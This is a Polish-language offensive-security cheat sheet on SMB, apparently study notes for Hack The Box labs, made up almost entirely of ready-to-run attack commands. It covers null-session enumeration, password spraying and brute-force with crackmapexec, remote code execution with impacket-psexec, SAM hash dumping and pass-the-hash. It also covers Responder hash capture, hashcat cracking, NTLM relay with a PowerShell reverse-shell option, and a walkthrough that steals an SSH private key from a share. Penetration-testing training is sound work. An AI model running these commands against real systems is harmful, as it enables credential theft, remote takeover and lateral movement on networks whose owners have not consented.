# SMB

## 

SMB (Server Message Block) — współdzielenie plików i drukarek w sieci.

| Port | Opis |
| --- | --- |
| 139/TCP | SMB przez NetBIOS |
| 445/TCP | SMB bezpośrednio przez TCP/IP (współczesny) |

**Samba** — implementacja SMB dla Linux/Unix.

---

## Rekonesans — Nmap

```bash
sudo nmap -sC -sV -p 139,445 10.10.10.10
```

Ujawnia: wersję SMB, hostname, OS, podpisywanie wiadomości.

---

## Enumeracja — Null Session (anonymous)

### smbclient

```bash
smbclient -N -L //10.10.10.10        # lista share'w bez hasła
smbclient -U user //10.10.10.10/share
```

### smbmap

```bash
smbmap -H 10.10.10.10                        # lista share'w i uprawnień
smbmap -H 10.10.10.10 -r notes               # przeglądaj katalog
smbmap -H 10.10.10.10 --download "notes\note.txt"
smbmap -H 10.10.10.10 --upload test.txt "notes\test.txt"
smbmap -H 10.10.10.10 -u user -p pass -r     # z credentials
```

### rpcclient

```bash
rpcclient -U'%' 10.10.10.10         # null session
rpcclient $> enumdomusers           # lista użytkowników
```

### enum4linux

```bash
./enum4linux-ng.py 10.10.10.10 -A -C
```

Zbiera: użytkowników, grupy, share'y, polityki haseł, OS.

---

## Brute-force i Password Spraying

```bash
# Password spray — jedno hasło, wielu użytkowników
crackmapexec smb 10.10.10.10 -u users.list -p 'Company01!' --local-auth

# Brute-force jednego użytkownika
crackmapexec smb 10.10.10.10 -u jason -p rockyou.txt --local-auth
```

> `[+] Pwn3d!` = konto ma uprawnienia admina
> 

> `--continue-on-success` — nie zatrzymuj się po pierwszym trafieniu
> 

---

## Remote Code Execution

### impacket-psexec

```bash
impacket-psexec administrator:'Hasło123!'@10.10.10.10
# daje shell jako nt authority\system
```

### CrackMapExec

```bash
# Wykonaj komendę CMD
crackmapexec smb 10.10.10.10 -u Administrator -p 'Hasło123!' -x 'whoami' --exec-method smbexec

# Wykonaj PowerShell
crackmapexec smb 10.10.10.10 -u Administrator -p 'Hasło123!' -X 'whoami'

# Enumercja zalogowanych użytkowników w całej sieci
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Hasło123!' --loggedon-users
```

### Inne narzędzia RCE

- `impacket-smbexec` — bez RemComSvc, przydatny gdy brak share z zapisem
- `impacket-atexec` — przez Task Scheduler
- Metasploit PsExec

---

## Dump SAM przez SMB

```bash
crackmapexec smb 10.10.10.10 -u administrator -p 'Hasło123!' --sam
```

---

## Pass-the-Hash (PtH)

Użycasz NT hasha zamiast hasła plaintext.

```bash
crackmapexec smb 10.10.10.10 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

impacket-psexec administrator@10.10.10.10 -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE
```

---

## Forced Authentication — Responder

Tworzysz fałszywy serwer SMB który przechwytuje hashes NTLMv2.

```bash
sudo responder -I eth0
# lub
sudo responder -I tun0
```

Przechwyci NetNTLMv2 hash gdy ofiara próbuje połączyć się ze złą nazwą share.

### Crackowanie NTLMv2

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Logi Responder: `/usr/share/responder/logs/`

### NTLM Relay (jeśli nie możesz złamać hasha)

```bash
# 1. Wyłącz SMB w Responder
# /etc/responder/Responder.conf → SMB = Off

# 2. Uruchom relay
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.146

# 3. Z reverse shellem
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.146 -c 'powershell -e BASE64'
```

---

## Przykład — HTB Lab

```bash
# 1. Skan
nmap -sC -sV 10.129.203.6

# 2. Enumercja share'w
smbmap -H 10.129.203.6

# 3. Brute-force hasła
crackmapexec smb 10.129.203.6 -u jason -p pws.list --local-auth

# 4. Pobierz klucz SSH z share
smbmap -H 10.129.203.6 -r --download "GGJ\id_rsa" -u jason -p "hasło"

# 5. Zaloguj się
chmod 700 id_rsa
ssh jason@10.129.203.6 -i id_rsa
```